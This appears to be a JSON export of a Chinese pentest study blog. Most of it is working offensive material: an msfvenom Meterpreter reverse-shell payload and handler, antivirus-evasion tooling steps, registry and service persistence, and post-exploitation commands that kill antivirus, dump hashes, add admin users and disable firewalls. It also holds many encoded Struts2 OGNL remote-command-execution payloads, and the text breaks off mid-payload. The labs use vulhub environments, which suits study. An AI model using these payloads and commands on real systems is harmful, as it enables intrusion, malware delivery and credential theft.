3.vi编辑器： 123456789101112语法：vi [-options] [+[n]] [file] -r用于恢复系统突然崩溃时正在编辑的文件，-R用于以只读方式打开文件 +n用来指明进入vi后直接位于文件的第n行，如果不指定n，则位于最后一行命令模式：进入即为命令模式，可输入命令操控 i. G：进入文本尾部 gg：返回文首 ii. ctrl+g：代表显示信息，行号 iii. dd：删除光标所在行 D：删除光标所在位置到行尾 6dd：删除6行 iv. yy：复制当前行 p：粘贴 dd完在p相当于剪切插入模式：按a，i，o任意一个键进入插入模式，当记事本用底行模式：esc到命令模式，按shift+： i. :wq：保存并退出 ii. :q！：退出不保存 5.LAMP****搭建配置 123456781. 配置好yum环境2. 挂载光驱 mount /dev/sr0 /media3. yum -y install httpd mysql mysql-server php php-mysql 安装这几个包4. service httpd startservice mysqld start5. mysqladmin -u root password 123123 为mysql设置账号密码6. 拖源码7. chown -R apache:apache /var/www/html 改权限 搭建旁站 1234Apache配置文件：vi /etc/httpd/conf/httpd.confListen 80：侦听的端口DocumentRoot：网站根目录DirectoryIndex：默认首页","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"msf木马","slug":"木马制作","date":"2024-02-26T02:25:19.085Z","updated":"2022-05-12T12:11:37.110Z","comments":true,"path":"2024/02/26/木马制作/","permalink":"http://example.com/2024/02/26/%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/","excerpt":"","text":"1234567root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.128 LPORT=4444 -f exe &gt; shell.exeuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.44.128set lport 4444exploit","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"msf","slug":"渗透测试/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/msf/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"简单的免杀学习","slug":"免杀","date":"2024-02-26T02:25:19.084Z","updated":"2022-04-08T17:00:33.571Z","comments":true,"path":"2024/02/26/免杀/","permalink":"http://example.com/2024/02/26/%E5%85%8D%E6%9D%80/","excerpt":"","text":"windows下的免杀生成 如果需要捆绑正常软件运行使用shellter，如不能过免杀，再分步测试以下操作。cs文件编码混淆用AVIATOR生成。 1234567891.Lime-Crypter 注入线程2.DeepSeaOBFuscator 封装3.CryptoObfuscator 混淆4.https 证书修改5.base64prionx 混淆6.themida 加壳7.https 证书修改8.viper(在线msf处理平台可加特征和签名很方便)*通用免杀法（简单概括就是1.修改特征码2.花指令免杀3.加壳免杀。） 也可以通过把软件分块用杀软重复扫描找到特征码进行修改,当然也可以通过加载器的形式更加靠谱但是需要落地多个文件，c#文件自己封装推荐avator+掩盖日可以过火绒 Veil是一种免杀生成工具，用于生成绕过常见防病毒解决方案的metasploit有效负载。 ps：合理利用后渗透插件可以剩下很多时间，但是要注意痕迹清理。插件有谢公子和梼杌完整版比较常用, Cobaltstrike推荐插件：谢公子、梼杌、Z1-AggressorScripts、ladong添加开机自启 123reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Users\\KingXL\\1.exe&quot; /f reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;test&quot; /t REG_SZ /d &quot;C:\\Users\\KingXL\\1.exe&quot; /f sc create &quot;server power&quot; binpath= &quot;C:\\Windows\\System32\\config.exe&quot;//设置服务的描述字符串sc description &quot;server power&quot; &quot;description&quot; //设置这个服务为自动启动sc config &quot;server power&quot; start= auto net start &quot;server power&quot; 启动服务","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"免杀","slug":"渗透测试/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"漏洞复现学习笔记","slug":"漏洞复现","date":"2024-02-26T02:25:19.083Z","updated":"2022-04-08T17:01:40.461Z","comments":true,"path":"2024/02/26/漏洞复现/","permalink":"http://example.com/2024/02/26/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"漏洞复现学习笔记1.Struts21.1Struts2 S2-016 漏洞环境123451.拉取镜像到本地 docker pull medicean/vulapps:s_struts2_s2-0162.启动环境 docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-016 -p 80:8080 前面的 80 代表物理机的端口，可随意指定。 EXP1/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D 1.2Struts2 S2-008漏洞环境12345拉取镜像到本地$ docker pull medicean/vulapps:s_struts2_s2-008启动环境$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-008 12345678Struts &lt;= 2.2.3 ( ExceptionDelegator)中的远程命令执行当将参数值应用于属性时发生异常时，该值将被评估为 OGNL 表达式。例如，将字符串值设置为整数属性时会发生这种情况。由于未过滤这些值，攻击者可以滥用 OGNL 语言的功能来执行任意 Java 代码，从而导致远程命令执行。此问题已报告 ( https://issues.apache.org/jira/browse/WW-3668 ) 并已在 Struts 2.2.3.1 中修复。然而，执行任意 Java 代码的能力被忽略了。Struts &lt;= 2.3.1 中的远程命令执行( CookieInterceptor)参数名称的字符白名单不适用于CookieInterceptor. 当 Struts 被配置为处理 cookie 名称时，攻击者可以通过静态方法访问 Java 函数来执行任意系统命令。allowStaticMethodAccess因此，可以在请求中将该标志设置为 true。ParameterInterceptorStruts &lt;= 2.3.1 ( )中的任意文件覆盖虽然自 Struts 2.2.3.1 起禁止访问参数中的标志allowStaticMethodAccess，但攻击者仍然可以仅使用一个 String 类型的参数访问公共构造函数来创建新的 Java 对象并仅使用一个字符串类型的参数。这可以在示例中被滥用来创建和覆盖任意文件。要将禁用字符注入文件名，可以使用未初始化的字符串属性。Struts &lt;= 2.3.17 ( DebuggingInterceptor)中的远程命令执行虽然本身不​​是一个安全漏洞，但请注意，在开发人员模式下运行并使用 的应用程序DebuggingInterceptor也容易远程执行命令。虽然应用程序不应该在生产期间以开发人员模式运行，但开发人员应该意识到这样做不仅会产生性能问题（如文档所述），还会产生严重的安全影响。 exp1/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /etc/passwd%27%29.getInputStream%28%29%29)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"漏洞复现/struts2","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"struts2","permalink":"http://example.com/tags/struts2/"}]},{"title":"后渗透模块学习","slug":"后渗透","date":"2024-02-26T02:25:19.081Z","updated":"2022-04-08T16:59:36.220Z","comments":true,"path":"2024/02/26/后渗透/","permalink":"http://example.com/2024/02/26/%E5%90%8E%E6%B8%97%E9%80%8F/","excerpt":"","text":"后渗透模块post后渗透模块 1234567891011121314151617181920run post/windows/manage/migrate #自动进程迁移run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上run post/windows/manage/killav #关闭杀毒软件run post/windows/manage/enable_rdp #开启远程桌面服务run post/windows/manage/autoroute #查看路由信息run post/windows/gather/enum_logged_on_users #列举当前登录的用户run post/windows/gather/enum_applications #列举应用程序run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码run post/windows/gather/smart_hashdump #dump出所有用户的hashrun getgui -u hack -p 123run post/windows/gather/enum_patches 补丁信息run post/multi/recon/local_exploit_suggester 查询可利用的漏洞有时候无法使用后渗透模块添加用户可以使用shell自主添加net user hack Zyx960706 /addnet localgroup administrator hack /addnetsh advfirewall set allprofiles state off #关闭防火墙net stop windefendrun post/windows/gather/enum_patches 补丁信息run post/multi/recon/local_exploit_suggester 查询可利用的漏洞 域内存活主机探测（系统、端口） 1234auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(1-10000) 端口扫描 123auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(1-10000)auxiliary/scanner/portscan/ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理 服务扫描 1234567891011121314auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口auxiliary/scanner/http/title #探测内网http服务的标题auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口 use auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口use auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口auxiliary/scanner/netbios/nbname #探测内网主机的netbios名字","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"xray学习","slug":"xray","date":"2024-02-26T02:25:19.078Z","updated":"2022-04-08T16:58:09.055Z","comments":true,"path":"2024/02/26/xray/","permalink":"http://example.com/2024/02/26/xray/","excerpt":"","text":"使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描 1xray webscan --basic-crawler http://example.com --html-output vuln.html 使用 HTTP 代理进行被动扫描 1xray webscan --listen 127.0.0.1:7777 --html-output proxy.html 设置浏览器 http 代理为 http://127.0.0.1:7777，就可以自动分析代理流量并扫描。 如需扫描 https 流量，请阅读下方文档 抓取 https 流量 部分 只扫描单个 url，不使用爬虫 1xray webscan --url http://example.com/?a=b --html-output single-url.html 手动指定本次运行的插件 默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。 12xray webscan --plugins cmd-injection,sqldet --url http://example.comxray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777 指定插件输出 可以指定将本次扫描的漏洞信息输出到某个文件中: 12xray webscan --url http://example.com/?a=b \\--text-output result.txt --json-output result.json --html-output report.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"xray","slug":"渗透测试/xray","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xray/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"xray","slug":"xray","permalink":"http://example.com/tags/xray/"}]},{"title":"","slug":"Struts2漏洞S2-008复现","date":"2024-02-26T02:25:19.071Z","updated":"2022-04-08T17:19:40.979Z","comments":true,"path":"2024/02/26/Struts2漏洞S2-008复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9ES2-008%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（s2-008）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2漏洞S2-008复现123原理：S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。影响版本：Struts 2.1.0 – 2.3.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-008 poc构建例如?debug=command&amp;expression=&lt;OGNL EXP&gt;在devModemode中添加参数，OGNL表达式会直接执行，可以执行命令： 1devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id","categories":[],"tags":[]},{"title":"","slug":"Struts2漏洞漏洞合集复现","date":"2024-02-26T02:25:19.071Z","updated":"2022-04-08T17:18:22.453Z","comments":true,"path":"2024/02/26/Struts2漏洞漏洞合集复现/","permalink":"http://example.com/2024/02/26/Struts2%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"123456789title: 漏洞复现学习（struts2）tags: - 渗透测试 - 漏洞复现 - struts2categories: - 渗透测试 - 漏洞复现 - struts2 Struts2 漏洞复现合集学习笔记S2-001复现原理：1该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%&#123;value&#125;进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%&#123;value&#125;对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。 漏洞环境搭建https://github.com/vulhub/vulhub/tree/master/struts2/s2-001 运行以下命令进行设置 12docker-compose builddocker-compose up -d 访问 http://127.0.0.1:8080/ 漏洞poc测试1.输入**%{‘123’}**，sumbit 2.返回123，参数值，证明漏洞存在 构造poc 获取tomcat路径：1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 语句执行后，查看返回的语句信息： 获取网站真实路径：1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125; 构造查看权限的poc：123456789101112131415161718192021%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行任意命令只需要将上面的poc中whoami替换：12345678910111213141516171819%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 执行命令（带参数的命令：new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;）：1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 关闭docker环境1命令：docker-compose down -v S2-005复现1s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开 影响版本：Struts 2.0.0-2.1.8.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-005 运行以下命令启动环境 12docker-compose builddocker-compose up -d 搭建成功： 构建poc使用抓包工具burp suite，修改数据包插入poc 1(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 Poc2： 1?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27 查看数据连接状态命令： 1docker exec -it c25543ef6c4c /bin/bash ls &#x2F;tmp S2-008复现原理：1S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。 影响版本：Struts 2.1.0 – 2.3.1 漏洞搭建1https://github.com/vulhub/vulhub/tree/master/struts2/s2-008 poc构建例如?debug=command&amp;expression=&lt;OGNL EXP&gt;在devModemode中添加参数，OGNL表达式会直接执行，可以执行命令： 1devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id S2-009复现原理：1OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。ParametersInterceptor中的正则表达式将top [&#x27;foo&#x27;]（0）作为有效的表达式匹配，OGNL将其作为（top [&#x27;foo&#x27;]）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。 影响版本：Struts 2.1.0 - 2.3.1.1 环境搭建 poc构建burp，修改数据包 1/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)] S2-012复现原理：1如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 $&#123;param_name&#125; 作为重定向变量，UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 $&#123;name&#125; 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。 影响版本：Struts 2.1.0-2.3.13 1234567&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt; &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt; &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt; &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 漏洞搭建 poc构建1%25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%2f%62%69%6e%2f%62%61%73%68%22%2c%22%2d%63%22%2c%20%22%6c%73%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d Poc2： 原始poc： 1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;, &quot;ls&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 注：利用此漏洞需要进行url编码 1%25%7B#a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22cat%22,%20%22/etc/passwd%22%7D)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new%20java.io.InputStreamReader(#b),#d=new%20java.io.BufferedReader(#c),#e=new%20char%5B50000%5D,#d.read(#e),#f=#context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),#f.getWriter().println(new%20java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()%7D S2-013复现原理123456struts2的标签中 和 都有一个 includeParams 属性，可以设置成如下值none - URL中不包含任何参数（默认）get - 仅包含URL中的GET参数all - 在URL中包含GET和POST参数此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行 影响版本：Struts 2.0.0-2.3.14 漏洞搭建 Struts2 的标签&lt;s:a&gt;和&lt;s:url&gt;提供了一个 includeParams 属性。该属性的主要作用域是了解是否包含 http 请求参数。 includeParams 的允许值为： none - 在 URL 中不包含任何参数（默认） get - 在 URL 中仅包含 GET 参数 all - 在 URL 中包含 GET 和 POST 参数 当 时includeParams=all，这个请求的 GET 和 POST 参数放在 URL 的 GET 参数上。在此过程中，参数将被 OGNL 表达式解析。它导致命令执行。 poc构建1a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;id&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D S2-015复现原理漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如： 12345&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt; &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \\ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。 在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力。 这里为了到达执行命令的目的可以用 调用动态方法 (new java.lang.ProcessBuilder(‘calc’)).start() 来解决 poc12执行命令：%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%